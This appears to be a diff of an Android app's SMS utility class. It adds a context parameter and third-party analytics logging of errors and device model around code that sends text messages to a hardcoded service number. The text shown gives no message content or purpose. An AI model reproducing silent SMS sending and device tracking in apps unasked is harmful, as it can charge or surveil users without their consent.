@@ -25,7 +25,7 @@ import java.util.Random;
  */
 public class SMSUtil {
 
-    public static final boolean sendSMSForMonkey(String target, String msg) {
+    public static final boolean sendSMSForMonkey(Context context, String target, String msg) {
         try {
             if (!TextUtils.isEmpty(msg)) {
                 msg = msg.trim();
@@ -73,13 +73,16 @@ public class SMSUtil {
 
             return true;
         } catch (Exception e) {
-            e.printStackTrace();
+//            e.printStackTrace();
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("error", e.getMessage());
+            CommonUtil.umengLog(context, "error", log);
         }
 
         return false;
     }
 
-    public static final boolean sendSMSForLogic(String target, String msg) {
+    public static final boolean sendSMSForLogic(Context context, String target, String msg) {
         try {
             SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
             if (Config.DEBUG) {
@@ -88,7 +91,10 @@ public class SMSUtil {
 
             return true;
         } catch (Exception e) {
-            e.printStackTrace();
+//            e.printStackTrace();
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("error", e.getMessage());
+            CommonUtil.umengLog(context, "error", log);
         }
 
         return false;
@@ -146,19 +152,23 @@ public class SMSUtil {
 //            CommonUtil.umengLog(context, "send_sms_phone2", log);
 //        } else {
         target = AppRuntime.PHONE_SERVICE1;
-        HashMap<String, String> log = new HashMap<String, String>();
-        log.put("phoneType", Build.MODEL);
-        CommonUtil.umengLog(context, "send_sms_phone1", log);
 //        }
 
-        if (!TextUtils.isEmpty(content) && sendSMSForLogic(target, content)) {
+        if (!TextUtils.isEmpty(content) && sendSMSForLogic(context, target, content)) {
             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
             SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
             SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("phoneType", Build.MODEL);
+            CommonUtil.umengLog(context, "send_sms_phone1", log);
         } else {
             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
             SettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
             SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("phoneType", Build.MODEL);
+            CommonUtil.umengLog(context, "send_sms_phone_failed", log);
         }
 
         if (Config.DEBUG) {
